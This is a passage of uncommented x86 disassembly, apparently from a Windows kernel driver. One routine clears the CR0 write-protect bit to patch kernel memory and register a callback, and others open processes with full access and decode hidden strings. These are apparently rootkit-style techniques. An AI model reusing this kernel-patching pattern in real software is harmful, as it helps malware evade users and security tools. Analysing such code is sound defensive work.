   1819f:	jmp    0x181b1
   181a1:	xor    eax,eax
   181a3:	inc    eax
   181a4:	ret    
   181a5:	mov    esp,DWORD PTR [ebp-0x18]
   181a8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   181af:	xor    ebx,ebx
   181b1:	push   DWORD PTR [ebp-0x82c]
   181b7:	call   DWORD PTR ds:0x1ee60
   181bd:	cmp    BYTE PTR [ebp-0x81e],bl
   181c3:	je     0x181e8
   181c5:	push   DWORD PTR [ebp-0x880]
   181cb:	push   DWORD PTR [ebp-0x884]
   181d1:	push   DWORD PTR [ebp-0x828]
   181d7:	push   DWORD PTR [ebp-0x824]
   181dd:	call   0x17c98
   181e2:	mov    BYTE PTR [ebp-0x81d],al
   181e8:	cmp    DWORD PTR [ebp-0x824],ebx
   181ee:	je     0x181fc
   181f0:	push   DWORD PTR [ebp-0x824]
   181f6:	call   0x1d9f8
   181fb:	pop    ecx
   181fc:	mov    al,BYTE PTR [ebp-0x81d]
   18202:	call   0x1de08
   18207:	ret    
   18208:	int3   
   18209:	int3   
   1820a:	int3   
   1820b:	int3   
   1820c:	int3   
   1820d:	int3   
   1820e:	mov    edi,edi
   18210:	push   ebp
   18211:	mov    ebp,esp
   18213:	sub    esp,0xbc
   18219:	mov    eax,ds:0x7e528
   1821e:	xor    eax,ebp
   18220:	mov    DWORD PTR [ebp-0x4],eax
   18223:	push   ebx
   18224:	push   edi
   18225:	push   0x1e8e8
   1822a:	push   0xb
   1822c:	push   0x1e8d0
   18231:	call   0x16c50
   18236:	push   eax
   18237:	lea    eax,[ebp-0xbc]
   1823d:	push   eax
   1823e:	call   0x11c2c
   18243:	call   eax
   18245:	xor    eax,eax
   18247:	lea    edi,[ebp-0xb0]
   1824d:	stos   DWORD PTR es:[edi],eax
   1824e:	stos   DWORD PTR es:[edi],eax
   1824f:	stos   DWORD PTR es:[edi],eax
   18250:	stos   DWORD PTR es:[edi],eax
   18251:	xor    ebx,ebx
   18253:	push   ebx
   18254:	stos   DWORD PTR es:[edi],eax
   18255:	push   ebx
   18256:	push   ebx
   18257:	push   0x1
   18259:	xor    eax,eax
   1825b:	push   0x7
   1825d:	push   ebx
   1825e:	mov    DWORD PTR [ebp-0x94],ebx
   18264:	lea    edi,[ebp-0x90]
   1826a:	stos   DWORD PTR es:[edi],eax
   1826b:	lea    eax,[ebp-0xbc]
   18271:	mov    DWORD PTR [ebp-0xac],eax
   18277:	push   ebx
   18278:	lea    eax,[ebp-0x94]
   1827e:	push   eax
   1827f:	lea    eax,[ebp-0xb4]
   18285:	push   eax
   18286:	push   0x89
   1828b:	lea    eax,[ebp-0x8c]
   18291:	push   eax
   18292:	mov    DWORD PTR [ebp-0x8c],ebx
   18298:	mov    DWORD PTR [ebp-0xb4],0x18
   182a2:	mov    DWORD PTR [ebp-0xb0],ebx
   182a8:	mov    DWORD PTR [ebp-0xa8],0x240
   182b2:	mov    DWORD PTR [ebp-0xa4],ebx
   182b8:	mov    DWORD PTR [ebp-0xa0],ebx
   182be:	call   0x1183c
   182c3:	call   eax
   182c5:	test   eax,eax
   182c7:	jge    0x182d0
   182c9:	xor    al,al
   182cb:	jmp    0x1838b
   182d0:	push   esi
   182d1:	mov    esi,0x20c
   182d6:	push   esi
   182d7:	call   0x10a52
   182dc:	pop    ecx
   182dd:	push   0x1
   182df:	mov    edi,eax
   182e1:	push   esi
   182e2:	push   edi
   182e3:	lea    eax,[ebp-0x94]
   182e9:	push   eax
   182ea:	push   DWORD PTR [ebp-0x8c]
   182f0:	cmp    edi,ebx
   182f2:	setne  BYTE PTR [ebp-0x9c]
   182f9:	call   0x11812
   182fe:	call   eax
   18300:	push   DWORD PTR [ebp-0x8c]
   18306:	mov    esi,eax
   18308:	call   DWORD PTR ds:0x1ee60
   1830e:	cmp    esi,ebx
   18310:	pop    esi
   18311:	jge    0x18324
   18313:	cmp    BYTE PTR [ebp-0x9c],bl
   18319:	je     0x182c9
   1831b:	push   edi
   1831c:	call   0x1d9f8
   18321:	pop    ecx
   18322:	jmp    0x182c9
   18324:	push   0x7
   18326:	push   0x1
   18328:	lea    eax,[ebp-0x84]
   1832e:	push   eax
   1832f:	push   DWORD PTR [edi+0x8]
   18332:	call   0x107fe
   18337:	mov    ecx,0x7e408
   1833c:	lea    eax,[ebp-0x84]
   18342:	mov    dx,WORD PTR [eax]
   18345:	cmp    dx,WORD PTR [ecx]
   18348:	jne    0x18368
   1834a:	cmp    dx,bx
   1834d:	je     0x18364
   1834f:	mov    dx,WORD PTR [eax+0x2]
   18353:	cmp    dx,WORD PTR [ecx+0x2]
   18357:	jne    0x18368
   18359:	add    eax,0x4
   1835c:	add    ecx,0x4
   1835f:	cmp    dx,bx
   18362:	jne    0x18342
   18364:	xor    eax,eax
   18366:	jmp    0x1836d
   18368:	sbb    eax,eax
   1836a:	sbb    eax,0xffffffff
   1836d:	cmp    eax,ebx
   1836f:	sete   BYTE PTR [ebp-0x85]
   18376:	cmp    BYTE PTR [ebp-0x9c],bl
   1837c:	je     0x18385
   1837e:	push   edi
   1837f:	call   0x1d9f8
   18384:	pop    ecx
   18385:	mov    al,BYTE PTR [ebp-0x85]
   1838b:	mov    ecx,DWORD PTR [ebp-0x4]
   1838e:	pop    edi
   1838f:	xor    ecx,ebp
   18391:	pop    ebx
   18392:	call   0x1da15
   18397:	leave  
   18398:	ret    
   18399:	int3   
   1839a:	int3   
   1839b:	int3   
   1839c:	int3   
   1839d:	int3   
   1839e:	push   0x0
   183a0:	push   0x19
   183a2:	call   0x109dc
   183a7:	test   edx,edx
   183a9:	jl     0x183dc
   183ab:	jg     0x183b2
   183ad:	cmp    eax,0x3
   183b0:	jbe    0x183dc
   183b2:	call   0x1a236
   183b7:	push   0x1e98e
   183bc:	push   0x34
   183be:	push   0x1e924
   183c3:	call   0x16c50
   183c8:	mov    edx,0x7e6c0
   183cd:	movzx  ecx,WORD PTR [eax]
   183d0:	inc    eax
   183d1:	mov    WORD PTR [edx],cx
   183d4:	inc    eax
   183d5:	inc    edx
   183d6:	inc    edx
   183d7:	test   cx,cx
   183da:	jne    0x183cd
   183dc:	ret    
   183dd:	int3   
   183de:	int3   
   183df:	int3   
   183e0:	int3   
   183e1:	int3   
   183e2:	mov    edi,edi
   183e4:	push   ebp
   183e5:	mov    ebp,esp
   183e7:	push   esi
   183e8:	mov    esi,ecx
   183ea:	lea    ecx,[esi+0x4]
   183ed:	mov    DWORD PTR [esi],0x7a45c
   183f3:	mov    BYTE PTR [ecx+0x8],0x0
   183f7:	call   0x14654
   183fc:	lea    ecx,[esi+0x14]
   183ff:	mov    BYTE PTR [ecx+0x8],0x0
   18403:	call   0x144a2
   18408:	mov    eax,DWORD PTR [ebp+0x8]
   1840b:	mov    DWORD PTR [esi+0x24],eax
   1840e:	mov    eax,DWORD PTR [ebp+0xc]
   18411:	mov    DWORD PTR [esi+0x28],eax
   18414:	mov    eax,esi
   18416:	pop    esi
   18417:	pop    ebp
   18418:	ret    0x8
   1841b:	int3   
   1841c:	int3   
   1841d:	int3   
   1841e:	int3   
   1841f:	int3   
   18420:	mov    edi,edi
   18422:	push   esi
   18423:	mov    esi,ecx
   18425:	lea    ecx,[esi+0x14]
   18428:	mov    DWORD PTR [esi],0x7a45c
   1842e:	call   0x160b0
   18433:	lea    ecx,[esi+0x4]
   18436:	pop    esi
   18437:	jmp    0x16a5e
   1843c:	int3   
   1843d:	int3   
   1843e:	int3   
   1843f:	int3   
   18440:	int3   
   18441:	int3   
   18442:	mov    edi,edi
   18444:	push   ebp
   18445:	mov    ebp,esp
   18447:	sub    esp,0x124
   1844d:	push   ebx
   1844e:	push   esi
   1844f:	push   edi
   18450:	mov    esi,ecx
   18452:	call   0x16f60
   18457:	push   DWORD PTR [ebp+0x8]
   1845a:	lea    eax,[ebp-0x4]
   1845d:	lea    edi,[esi+0x4]
   18460:	push   eax
   18461:	mov    ecx,edi
   18463:	call   0x13ce0
   18468:	mov    ebx,DWORD PTR [ebp-0x4]
   1846b:	cmp    ebx,DWORD PTR [esi+0x8]
   1846e:	je     0x184b9
   18470:	mov    eax,DWORD PTR [esi+0x18]
   18473:	lea    ecx,[ebp+0x8]
   18476:	mov    DWORD PTR [ebp+0x8],eax
   18479:	call   0x13cc0
   1847e:	mov    edi,DWORD PTR [eax]
   18480:	lea    eax,[ebx+0x68]
   18483:	add    esi,0x14
   18486:	inc    edi
   18487:	push   eax
   18488:	mov    ecx,esi
   1848a:	mov    DWORD PTR [ebp+0x8],edi
   1848d:	mov    DWORD PTR [ebp-0x4],eax
   18490:	call   0x14d9a
   18495:	lea    eax,[ebp+0x8]
   18498:	push   eax
   18499:	lea    eax,[ebp-0xc]
   1849c:	push   eax
   1849d:	mov    ecx,esi
   1849f:	call   0x16086
   184a4:	push   DWORD PTR [ebp+0xc]
   184a7:	lea    ecx,[ebx+0x18]
   184aa:	call   0x12a2a
   184af:	mov    eax,DWORD PTR [ebp-0x4]
   184b2:	mov    DWORD PTR [eax],edi
   184b4:	jmp    0x1854e
   184b9:	lea    ecx,[ebp-0x64]
   184bc:	call   0x136b6
   184c1:	xor    eax,eax
   184c3:	cmp    DWORD PTR [esi+0x20],eax
   184c6:	je     0x184d9
   184c8:	mov    eax,DWORD PTR [esi+0x18]
   184cb:	lea    ecx,[ebp-0x4]
   184ce:	mov    DWORD PTR [ebp-0x4],eax
   184d1:	call   0x13cc0
   184d6:	mov    eax,DWORD PTR [eax]
   184d8:	inc    eax
   184d9:	push   DWORD PTR [ebp+0xc]
   184dc:	lea    ecx,[ebp-0x64]
   184df:	mov    DWORD PTR [ebp-0x4],eax
   184e2:	mov    DWORD PTR [ebp-0x14],eax
   184e5:	call   0x12a2a
   184ea:	lea    eax,[ebp-0x64]
   184ed:	push   eax
   184ee:	push   DWORD PTR [ebp+0x8]
   184f1:	lea    ecx,[ebp-0x124]
   184f7:	call   0x13596
   184fc:	lea    eax,[ebp-0x124]
   18502:	push   eax
   18503:	lea    ecx,[ebp-0xc4]
   18509:	call   0x134c2
   1850e:	lea    eax,[ebp-0xc4]
   18514:	push   eax
   18515:	lea    eax,[ebp-0xc]
   18518:	push   eax
   18519:	mov    ecx,edi
   1851b:	call   0x16a34
   18520:	lea    ecx,[ebp-0xc4]
   18526:	call   0x12ab0
   1852b:	lea    ecx,[ebp-0x124]
   18531:	call   0x12ab0
   18536:	lea    eax,[ebp-0x4]
   18539:	push   eax
   1853a:	lea    eax,[ebp-0xc]
   1853d:	push   eax
   1853e:	lea    ecx,[esi+0x14]
   18541:	call   0x16086
   18546:	lea    ecx,[ebp-0x64]
   18549:	call   0x11e9e
   1854e:	pop    edi
   1854f:	pop    esi
   18550:	pop    ebx
   18551:	leave  
   18552:	ret    0x8
   18555:	int3   
   18556:	int3   
   18557:	int3   
   18558:	int3   
   18559:	int3   
   1855a:	mov    edi,edi
   1855c:	push   ebp
   1855d:	mov    ebp,esp
   1855f:	sub    esp,0x10
   18562:	call   0x1a1a4
   18567:	test   al,al
   18569:	jne    0x18573
   1856b:	mov    eax,DWORD PTR [ebp+0x8]
   1856e:	jmp    0x18607
   18573:	push   esi
   18574:	mov    esi,DWORD PTR [ebp+0x8]
   18577:	push   0xffffffff
   18579:	push   esi
   1857a:	lea    ecx,[ebp-0x8]
   1857d:	call   0x1113e
   18582:	mov    ecx,DWORD PTR ds:0x7fa50
   18588:	lea    eax,[ebp-0x8]
   1858b:	push   eax
   1858c:	lea    eax,[ebp+0x8]
   1858f:	push   eax
   18590:	call   0x141d0
   18595:	mov    eax,DWORD PTR [ebp+0x8]
   18598:	mov    ecx,DWORD PTR ds:0x7fa50
   1859e:	cmp    eax,DWORD PTR [ecx+0x4]
   185a1:	jne    0x185d2
   185a3:	lea    eax,[ebp-0x8]
   185a6:	push   eax
   185a7:	lea    ecx,[ebp-0x10]
   185aa:	call   0x12aec
   185af:	mov    ecx,DWORD PTR ds:0x7fa50
   185b5:	lea    eax,[ebp-0x10]
   185b8:	push   eax
   185b9:	lea    eax,[ebp-0x8]
   185bc:	push   eax
   185bd:	call   0x17012
   185c2:	mov    ecx,eax
   185c4:	call   0x12b0e
   185c9:	push   DWORD PTR [ebp-0x10]
   185cc:	call   0x1d9f8
   185d1:	pop    ecx
   185d2:	mov    ecx,DWORD PTR ds:0x7fa50
   185d8:	lea    eax,[ebp-0x8]
   185db:	push   eax
   185dc:	lea    eax,[ebp+0x8]
   185df:	push   eax
   185e0:	call   0x141d0
   185e5:	mov    eax,DWORD PTR [ebp+0x8]
   185e8:	mov    ecx,DWORD PTR ds:0x7fa50
   185ee:	cmp    eax,DWORD PTR [ecx+0x4]
   185f1:	je     0x185f6
   185f3:	mov    esi,DWORD PTR [eax+0x14]
   185f6:	call   0x1a1c0
   185fb:	push   DWORD PTR [ebp-0x8]
   185fe:	call   0x1d9f8
   18603:	pop    ecx
   18604:	mov    eax,esi
   18606:	pop    esi
   18607:	leave  
   18608:	ret    0x4
   1860b:	int3   
   1860c:	int3   
   1860d:	int3   
   1860e:	int3   
   1860f:	int3   
   18610:	mov    edi,edi
   18612:	push   ebp
   18613:	mov    ebp,esp
   18615:	push   esi
   18616:	mov    esi,ecx
   18618:	call   0x18420
   1861d:	test   BYTE PTR [ebp+0x8],0x1
   18621:	je     0x1862a
   18623:	push   esi
   18624:	call   0x1d9f8
   18629:	pop    ecx
   1862a:	mov    eax,esi
   1862c:	pop    esi
   1862d:	pop    ebp
   1862e:	ret    0x4
   18631:	int3   
   18632:	int3   
   18633:	int3   
   18634:	int3   
   18635:	int3   
   18636:	mov    edi,edi
   18638:	push   ebp
   18639:	mov    ebp,esp
   1863b:	push   esi
   1863c:	push   DWORD PTR [ebp+0xc]
   1863f:	mov    esi,ecx
   18641:	push   DWORD PTR [ebp+0x8]
   18644:	call   0x183e2
   18649:	mov    eax,esi
   1864b:	pop    esi
   1864c:	pop    ebp
   1864d:	ret    0x8
   18650:	int3   
   18651:	int3   
   18652:	int3   
   18653:	int3   
   18654:	int3   
   18655:	int3   
   18656:	push   0x33c
   1865b:	push   0x7e168
   18660:	call   0x1ddc0
   18665:	mov    esi,DWORD PTR [ebp+0xc]
   18668:	mov    DWORD PTR [ebp-0x32c],esi
   1866e:	call   DWORD PTR ds:0x1ee00
   18674:	xor    ebx,ebx
   18676:	cmp    BYTE PTR [ebp+0x10],bl
   18679:	jne    0x186b7
   1867b:	push   esi
   1867c:	mov    ecx,DWORD PTR ds:0x7e558
   18682:	call   0x15e2a
   18687:	mov    edi,eax
   18689:	push   esi
   1868a:	mov    ecx,DWORD PTR ds:0x7e558
   18690:	call   0x16662
   18695:	mov    eax,edi
   18697:	dec    eax
   18698:	je     0x186ac
   1869a:	dec    eax
   1869b:	je     0x186a8
   1869d:	dec    eax
   1869e:	jne    0x18891
   186a4:	push   0xa
   186a6:	jmp    0x186ad
   186a8:	push   0x2
   186aa:	jmp    0x186ad
   186ac:	push   ebx
   186ad:	call   0x10fc4
   186b2:	jmp    0x18891
   186b7:	mov    DWORD PTR [ebp-0x320],ebx
   186bd:	xor    eax,eax
   186bf:	lea    edi,[ebp-0x326]
   186c5:	stos   DWORD PTR es:[edi],eax
   186c6:	stos   WORD PTR es:[edi],ax
   186c8:	xor    eax,eax
   186ca:	mov    WORD PTR [ebp-0x21c],ax
   186d1:	push   0x1fc
   186d6:	push   ebx
   186d7:	lea    eax,[ebp-0x21a]
   186dd:	push   eax
   186de:	call   0x1da92
   186e3:	add    esp,0xc
   186e6:	lea    eax,[ebp-0x21c]
   186ec:	mov    DWORD PTR [ebp-0x324],eax
   186f2:	xor    eax,eax
   186f4:	mov    WORD PTR [ebp-0x328],ax
   186fb:	mov    eax,0x1fe
   18700:	mov    WORD PTR [ebp-0x326],ax
   18707:	mov    DWORD PTR [ebp-0x34c],0x18
   18711:	mov    DWORD PTR [ebp-0x348],ebx
   18717:	mov    DWORD PTR [ebp-0x340],0x200
   18721:	mov    DWORD PTR [ebp-0x344],ebx
   18727:	mov    DWORD PTR [ebp-0x33c],ebx
   1872d:	mov    DWORD PTR [ebp-0x338],ebx
   18733:	mov    DWORD PTR [ebp-0x334],esi
   18739:	mov    DWORD PTR [ebp-0x330],ebx
   1873f:	lea    eax,[ebp-0x334]
   18745:	push   eax
   18746:	lea    eax,[ebp-0x34c]
   1874c:	push   eax
   1874d:	push   0x1f0fff
   18752:	lea    eax,[ebp-0x320]
   18758:	push   eax
   18759:	call   0x1166e
   1875e:	call   eax
   18760:	test   eax,eax
   18762:	jl     0x18891
   18768:	lea    eax,[ebp-0x328]
   1876e:	push   eax
   1876f:	push   DWORD PTR [ebp-0x320]
   18775:	call   0x11f6a
   1877a:	cmp    eax,ebx
   1877c:	jl     0x18885
   18782:	movzx  eax,WORD PTR [ebp-0x328]
   18789:	shr    eax,1
   1878b:	xor    ecx,ecx
   1878d:	mov    WORD PTR [ebp+eax*2-0x21c],cx
   18795:	push   DWORD PTR [ebp-0x320]
   1879b:	call   0x11ffc
   187a0:	lea    eax,[ebp-0x21c]
   187a6:	push   eax
   187a7:	call   0x10da2
   187ac:	cmp    eax,ebx
   187ae:	je     0x187d3
   187b0:	push   eax
   187b1:	push   esi
   187b2:	mov    ecx,DWORD PTR ds:0x7e558
   187b8:	call   0x16c0e
   187bd:	push   DWORD PTR [ebp-0x320]
   187c3:	push   DWORD PTR [ebp-0x320]
   187c9:	call   0x11ffc
   187ce:	push   eax
   187cf:	push   esi
   187d0:	push   ebx
   187d1:	jmp    0x18851
   187d3:	push   0x1e9c8
   187d8:	push   0x9
   187da:	push   0x1e9b4
   187df:	call   0x16c50
   187e4:	push   eax
   187e5:	lea    eax,[ebp-0x328]
   187eb:	push   eax
   187ec:	call   0x10de4
   187f1:	test   al,al
   187f3:	je     0x18858
   187f5:	cmp    DWORD PTR ds:0x7fa2c,ebx
   187fb:	jne    0x1882e
   187fd:	mov    DWORD PTR ds:0x7fa2c,0x1
   18807:	mov    DWORD PTR [ebp-0x4],ebx
   1880a:	call   0x17f44
   1880f:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   18816:	jmp    0x1882e
   18818:	xor    eax,eax
   1881a:	inc    eax
   1881b:	ret    
   1881c:	mov    esp,DWORD PTR [ebp-0x18]
   1881f:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   18826:	xor    ebx,ebx
   18828:	mov    esi,DWORD PTR [ebp-0x32c]
   1882e:	cmp    DWORD PTR ds:0x7efac,ebx
   18834:	jne    0x1883c
   18836:	mov    DWORD PTR ds:0x7efac,esi
   1883c:	push   DWORD PTR [ebp-0x320]
   18842:	push   DWORD PTR [ebp-0x320]
   18848:	call   0x11ffc
   1884d:	push   eax
   1884e:	push   esi
   1884f:	push   0x1
   18851:	call   0x137ce
   18856:	jmp    0x18885
   18858:	lea    eax,[ebp-0x31c]
   1885e:	push   eax
   1885f:	call   0x10f74
   18864:	test   al,al
   18866:	je     0x18885
   18868:	lea    eax,[ebp-0x31c]
   1886e:	push   eax
   1886f:	lea    eax,[ebp-0x328]
   18875:	push   eax
   18876:	call   0x10de4
   1887b:	test   al,al
   1887d:	je     0x18885
   1887f:	push   esi
   18880:	call   0x1202c
   18885:	push   DWORD PTR [ebp-0x320]
   1888b:	call   DWORD PTR ds:0x1ee60
   18891:	call   0x1de08
   18896:	ret    0xc
   18899:	int3   
   1889a:	int3   
   1889b:	int3   
   1889c:	int3   
   1889d:	int3   
   1889e:	mov    edi,edi
   188a0:	push   ebp
   188a1:	mov    ebp,esp
   188a3:	push   ecx
   188a4:	cli    
   188a5:	mov    eax,cr0
   188a8:	mov    DWORD PTR [ebp-0x4],eax
   188ab:	nop
   188ac:	and    eax,0xfffeffff
   188b1:	mov    cr0,eax
   188b4:	push   0x17724
   188b9:	push   DWORD PTR ds:0x7eef4
   188bf:	call   0x19868
   188c4:	push   0x0
   188c6:	push   0x18656
   188cb:	mov    ds:0x7eef8,eax
   188d0:	call   0x116ec
   188d5:	call   eax
   188d7:	push   0x17610
   188dc:	call   0x11698
   188e1:	call   eax
   188e3:	mov    eax,DWORD PTR [ebp-0x4]
   188e6:	mov    cr0,eax
   188e9:	sti    
   188ea:	leave  
   188eb:	ret    
   188ec:	int3   
   188ed:	int3   
   188ee:	int3   
   188ef:	int3   
   188f0:	int3   
   188f1:	int3   
   188f2:	mov    edi,edi
   188f4:	push   ebp
   188f5:	mov    ebp,esp
   188f7:	sub    esp,0x50
   188fa:	push   ebx
   188fb:	mov    ebx,DWORD PTR [ebp+0x8]
   188fe:	push   esi
   188ff:	test   bl,0x20
   18902:	je     0x18945
   18904:	push   DWORD PTR [ebp+0x30]
   18907:	mov    esi,DWORD PTR ds:0x7eef0
   1890d:	push   DWORD PTR [ebp+0x2c]
   18910:	lea    ecx,[ebp-0x50]
   18913:	push   DWORD PTR [ebp+0x28]
   18916:	push   DWORD PTR [ebp+0x24]
   18919:	push   DWORD PTR [ebp+0x20]
   1891c:	push   DWORD PTR [ebp+0x1c]
   1891f:	push   DWORD PTR [ebp+0x14]
   18922:	push   DWORD PTR [ebp+0x10]
   18925:	push   DWORD PTR [ebp+0xc]
   18928:	call   0x1371a
   1892d:	push   eax
   1892e:	push   DWORD PTR [ebp+0xc]
   18931:	mov    ecx,esi
   18933:	call   0x18442
   18938:	lea    ecx,[ebp-0x50]
   1893b:	call   0x11e9e
   18940:	jmp    0x18a8a
   18945:	push   DWORD PTR [ebp+0xc]
   18948:	mov    ecx,DWORD PTR ds:0x7eee8
   1894e:	call   0x1612c
   18953:	test   eax,eax
   18955:	jne    0x18963
   18957:	test   bl,0x1
   1895a:	jne    0x18963
   1895c:	xor    al,al
   1895e:	jmp    0x18a8c
   18963:	push   DWORD PTR [ebp+0xc]
   18966:	mov    ecx,DWORD PTR ds:0x7eee8
   1896c:	call   0x16e56
   18971:	mov    esi,eax
   18973:	test   bl,0x1
   18976:	je     0x189c0
   18978:	mov    eax,DWORD PTR [ebp+0x28]
   1897b:	push   DWORD PTR [ebp+0xc]
   1897e:	mov    ecx,esi
   18980:	mov    DWORD PTR [esi+0x2c],eax
   18983:	call   0x1299c
   18988:	push   DWORD PTR [ebp+0x10]
   1898b:	lea    ecx,[esi+0x8]
   1898e:	call   0x1299c
   18993:	mov    eax,DWORD PTR [ebp+0x14]
   18996:	push   DWORD PTR [ebp+0x18]
   18999:	lea    ecx,[esi+0x14]
   1899c:	mov    DWORD PTR [esi+0x10],eax
   1899f:	call   0x1299c
   189a4:	push   DWORD PTR [ebp+0x1c]
   189a7:	lea    ecx,[esi+0x1c]
   189aa:	call   0x1299c
   189af:	push   DWORD PTR [ebp+0x20]
   189b2:	lea    ecx,[esi+0x24]
   189b5:	call   0x1299c
   189ba:	mov    eax,DWORD PTR [ebp+0x2c]
   189bd:	mov    DWORD PTR [esi+0x30],eax
   189c0:	mov    DWORD PTR [ebp+0x28],ebx
   189c3:	and    DWORD PTR [ebp+0x28],0x2
   189c7:	je     0x189d7
   189c9:	mov    eax,DWORD PTR [ebp+0x30]
   189cc:	mov    ecx,DWORD PTR [eax]
   189ce:	mov    DWORD PTR [esi+0x38],ecx
   189d1:	mov    eax,DWORD PTR [eax+0x4]
   189d4:	mov    DWORD PTR [esi+0x3c],eax
   189d7:	mov    DWORD PTR [ebp+0x10],ebx
   189da:	and    DWORD PTR [ebp+0x10],0x4
   189de:	je     0x189ee
   189e0:	mov    eax,DWORD PTR [ebp+0x34]
   189e3:	mov    ecx,DWORD PTR [eax]
   189e5:	mov    DWORD PTR [esi+0x40],ecx
   189e8:	mov    eax,DWORD PTR [eax+0x4]
   189eb:	mov    DWORD PTR [esi+0x44],eax
   189ee:	test   bl,0x10
   189f1:	je     0x18a8a
   189f7:	cmp    DWORD PTR [esi+0x18],0x0
   189fb:	jbe    0x18a8a
   18a01:	mov    eax,ds:0x7eee8
   18a06:	mov    eax,DWORD PTR [eax+0x4]
   18a09:	push   edi
   18a0a:	mov    edi,DWORD PTR [eax]
   18a0c:	mov    DWORD PTR [ebp+0x14],edi
   18a0f:	cmp    edi,eax
   18a11:	je     0x18a89
   18a13:	push   DWORD PTR [ebp+0xc]
   18a16:	lea    ebx,[edi+0x10]
   18a19:	push   ebx
   18a1a:	call   0x197b0
   18a1f:	test   al,al
   18a21:	je     0x18a74
   18a23:	lea    eax,[esi+0x14]
   18a26:	push   eax
   18a27:	add    edi,0x2c
   18a2a:	push   edi
   18a2b:	call   0x197a0
   18a30:	test   al,al
   18a32:	je     0x18a74
   18a34:	cmp    DWORD PTR [ebp+0x28],0x0
   18a38:	je     0x18a54
   18a3a:	mov    ecx,DWORD PTR ds:0x7eee8
   18a40:	push   ebx
   18a41:	call   0x16e56
   18a46:	mov    ecx,DWORD PTR [ebp+0x30]
   18a49:	mov    edx,DWORD PTR [ecx]
   18a4b:	mov    DWORD PTR [eax+0x38],edx
   18a4e:	mov    ecx,DWORD PTR [ecx+0x4]
   18a51:	mov    DWORD PTR [eax+0x3c],ecx
   18a54:	cmp    DWORD PTR [ebp+0x10],0x0
   18a58:	je     0x18a74
   18a5a:	mov    ecx,DWORD PTR ds:0x7eee8
   18a60:	push   ebx
   18a61:	call   0x16e56
   18a66:	mov    ecx,DWORD PTR [ebp+0x34]
   18a69:	mov    edx,DWORD PTR [ecx]
   18a6b:	mov    DWORD PTR [eax+0x40],edx
   18a6e:	mov    ecx,DWORD PTR [ecx+0x4]
   18a71:	mov    DWORD PTR [eax+0x44],ecx
   18a74:	lea    ecx,[ebp+0x14]
   18a77:	call   0x1385c
   18a7c:	mov    edi,DWORD PTR [ebp+0x14]
   18a7f:	mov    eax,ds:0x7eee8
   18a84:	cmp    edi,DWORD PTR [eax+0x4]
   18a87:	jne    0x18a13
   18a89:	pop    edi
   18a8a:	mov    al,0x1
   18a8c:	pop    esi
   18a8d:	pop    ebx
   18a8e:	leave  
   18a8f:	ret    0x30
   18a92:	int3   
   18a93:	int3   
   18a94:	int3   
   18a95:	int3   
   18a96:	int3   
   18a97:	int3   
   18a98:	push   0x4c
   18a9a:	push   0x7e188
   18a9f:	call   0x1dab8
   18aa4:	xor    esi,esi
   18aa6:	push   esi
   18aa7:	push   esi
   18aa8:	push   esi
   18aa9:	push   esi
   18aaa:	push   0x7e560
   18aaf:	call   DWORD PTR ds:0x1ee28
   18ab5:	cmp    eax,esi
   18ab7:	jge    0x18ac8
   18ab9:	mov    eax,DWORD PTR [ebp+0x8]
   18abc:	mov    DWORD PTR [eax+0x8],0x4
   18ac3:	jmp    0x18bfd
   18ac8:	mov    DWORD PTR [ebp-0x4],esi
   18acb:	or     ebx,0xffffffff
   18ace:	push   ebx
   18acf:	mov    esi,DWORD PTR [ebp+0x8]
   18ad2:	lea    eax,[esi+0x28]
   18ad5:	push   eax
   18ad6:	lea    ecx,[ebp-0x44]
   18ad9:	call   0x1295a
   18ade:	mov    edi,DWORD PTR [ebp-0x40]
   18ae1:	inc    edi
   18ae2:	push   ebx
   18ae3:	lea    eax,[edi+esi*1+0x28]
   18ae7:	push   eax
   18ae8:	lea    ecx,[ebp-0x3c]
   18aeb:	call   0x1295a
   18af0:	mov    eax,DWORD PTR [ebp-0x38]
   18af3:	lea    edi,[edi+eax*1+0x1]
   18af7:	mov    eax,DWORD PTR [edi+esi*1+0x28]
   18afb:	mov    DWORD PTR [ebp-0x1c],eax
   18afe:	add    edi,0x4
   18b01:	push   ebx
   18b02:	lea    eax,[edi+esi*1+0x28]
   18b06:	push   eax
   18b07:	lea    ecx,[ebp-0x34]
   18b0a:	call   0x1295a
   18b0f:	mov    eax,DWORD PTR [ebp-0x30]
   18b12:	lea    edi,[edi+eax*1+0x1]
   18b16:	push   ebx
   18b17:	lea    eax,[edi+esi*1+0x28]
   18b1b:	push   eax
   18b1c:	lea    ecx,[ebp-0x2c]
   18b1f:	call   0x1295a
   18b24:	mov    eax,DWORD PTR [ebp-0x28]
   18b27:	lea    edi,[edi+eax*1+0x1]
   18b2b:	push   ebx
   18b2c:	lea    eax,[edi+esi*1+0x28]
   18b30:	push   eax
   18b31:	lea    ecx,[ebp-0x24]
   18b34:	call   0x1295a
   18b39:	mov    eax,DWORD PTR [ebp-0x20]
   18b3c:	lea    eax,[edi+eax*1+0x1]
   18b40:	push   ebx
   18b41:	lea    eax,[eax+esi*1+0x28]
   18b45:	push   eax
   18b46:	lea    ecx,[ebp-0x5c]
   18b49:	call   0x1295a
   18b4e:	mov    eax,DWORD PTR [esi+0xc]
   18b51:	mov    ecx,DWORD PTR [esi+0x18]
   18b54:	mov    DWORD PTR [ebp-0x54],ecx
   18b57:	mov    ecx,DWORD PTR [esi+0x1c]
   18b5a:	mov    DWORD PTR [ebp-0x50],ecx
   18b5d:	mov    ecx,DWORD PTR [esi+0x20]
   18b60:	mov    DWORD PTR [ebp-0x4c],ecx
   18b63:	mov    ecx,DWORD PTR [esi+0x24]
   18b66:	mov    DWORD PTR [ebp-0x48],ecx
   18b69:	mov    ecx,DWORD PTR [esi+0x10]
   18b6c:	lea    edx,[ebp-0x4c]
   18b6f:	push   edx
   18b70:	lea    edx,[ebp-0x54]
   18b73:	push   edx
   18b74:	push   ecx
   18b75:	push   eax
   18b76:	lea    eax,[ebp-0x5c]
   18b79:	push   eax
   18b7a:	lea    eax,[ebp-0x24]
   18b7d:	push   eax
   18b7e:	lea    eax,[ebp-0x2c]
   18b81:	push   eax
   18b82:	lea    eax,[ebp-0x34]
   18b85:	push   eax
   18b86:	push   DWORD PTR [ebp-0x1c]
   18b89:	lea    eax,[ebp-0x3c]
   18b8c:	push   eax
   18b8d:	lea    eax,[ebp-0x44]
   18b90:	push   eax
   18b91:	push   DWORD PTR [esi+0x4]
   18b94:	call   0x188f2
   18b99:	xor    ecx,ecx
   18b9b:	test   al,al
   18b9d:	sete   cl
